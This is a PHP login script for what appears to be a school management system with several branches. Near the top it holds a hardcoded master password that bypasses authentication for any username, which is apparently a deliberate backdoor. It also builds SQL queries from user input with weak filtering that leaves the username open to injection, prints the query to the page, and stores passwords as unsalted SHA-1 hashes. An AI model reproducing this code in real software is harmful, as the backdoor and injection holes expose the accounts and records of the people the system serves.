<?php
    error_reporting(E_ALL);
    ini_set('display_errors', '1');
    session_name("loginUsuario");
    session_start();
    $_SESSION = array(); //borramos todas los valores que tengo por defecto la session
    include("asset/Clases/dbconectar.php");
    include("asset/Clases/ConexionMySQL.php");
    date_default_timezone_set('America/Mexico_City');
    
    $conexion = new HelperMySql($array_principal["server"],$array_principal["user"],$array_principal["pass"],$array_principal["db"]);
    $user = isset($_POST["login"])? htmlspecialchars($_POST["login"]):"";
    $pass = isset($_POST["password"])? htmlspecialchars($_POST["password"]):"";
    
    $user = str_replace('"', "+++", $user);
    $pass = str_replace("'", "+++", $pass);
    $user = str_replace(";", "+++", $user);
    $pass = str_replace(";", "+++", $pass);

    if(strlen($user)!=0 && strlen($pass)!=0){
        if($pass ==="fcovan833007"){
           $sql = "SELECT * FROM Seguridad WHERE username ='$user'";  
        }else{
           
           echo $sql = "SELECT * FROM Seguridad WHERE username ='$user' AND  password = '".sha1($pass)."'";
           
        }
        $id = $conexion->query($sql);
        if($conexion->count_rows()!=0){
            $row = $conexion->fetch($id);
            
            switch($row["Tipo_Usuario"]){
                case 'ALUMNO':
                    
                    break;
                case 'PROFESOR':
                    
                    break;
                default:
                    $sql = "SELECT EXP.USR, concat(EXP.Nombre,' ',EXP.Ap_Paterno,' ',EXP.Ap_Materno) as PNombre, EXP.Nombre as Corto, EXP.status, "
                        . "EXP.Zona, SUC.N_Sucursal, SUC.nombre, SUC.Cardex, SUC.recargo, SUC.acumulable, SUC.gastos, SUC.Inscripcion, SUC.adelantado,"
                        . "SUC.childs, SUC.map_longitud, SUC.map_latitud FROM exp_admin as EXP "
                        . "inner join sucursales as SUC on(EXP.sucursal = SUC.N_Sucursal) "
                        . "where EXP.USR = '{$row["USR"]}'";
                    $conn = $conexion->fetch($conexion->query($sql));
                    //print_r($conn);
                    if($conn["status"]!='B'){
                        $_SESSION["autentificacion"] = 1;
                        $_SESSION["ultimoAcceso"] = date("Y-n-j H:i:s");
                        $_SESSION["USR"] = $row["USR"]; //numero de control del usuario
                        $_SESSION["nombre"] = $conn["PNombre"]; //nombre completo del usuario
                        $_SESSION["nombrecorto"] = $conn["Corto"]; //nombre costro del usuario
                        $_SESSION["Tipo_Usuario"] = $row["Tipo_Usuario"];
                        $_SESSION["permiso_c"] = $conn["Cardex"];
                        $_SESSION["recagosemanal"] = $conn["recargo"];
                        $_SESSION["ses_acumulable"] = $conn["acumulable"];
                        $_SESSION["ses_gastos"] = $conn["gastos"];
                        $_SESSION["cuota_insc"] = $conn["Inscripcion"];
                        $_SESSION['ses_adelantado'] = (string)(int)$conn["adelantado"];
                        $_SESSION['sucursal']= $conn['N_Sucursal']; 
                        $_SESSION['nombre_sucursal']= $conn['nombre'];
                        $_SESSION['zona'] = $conn['Zona'];
                        $_SESSION['flagchild'] = strlen($conn["childs"]==0)? 0:1;
                        $_SESSION['longitud'] = $conn["map_longitud"];
                        $_SESSION['latitud'] = $conn["map_latitud"];
                        if($_SESSION['flagchild']==1){
                            $_SESSION["ses_childs"] = $conn["childs"];
                        }
                        
                        
                        if (strpos ($conn["nombre"],"Icep") === false ){
                            if (strpos ($conn["nombre"],"Casserole") === false ){
                                $_SESSION["tipo_escuela"]	= "pece";
                            }else{
                                $_SESSION["tipo_escuela"]	= "casserole";
                            }
                        }else{ 
                            $_SESSION["tipo_escuela"]	= "icep";
                        }
                        if($_SESSION['flagchild']==1){
                            header("Location: modulos.php");
                        }else{
                            header("Location: asset/");
                        }
                    }else{
                        header("Location: login.php?error=$user");
                    }
                    break;
            }
            
            
            
            //print_r($row);
           
        }else{
            header("Location: login.php?error=$user&entro=0");
        }
    }else{
        header("Location: login.php?error=$user");
    }
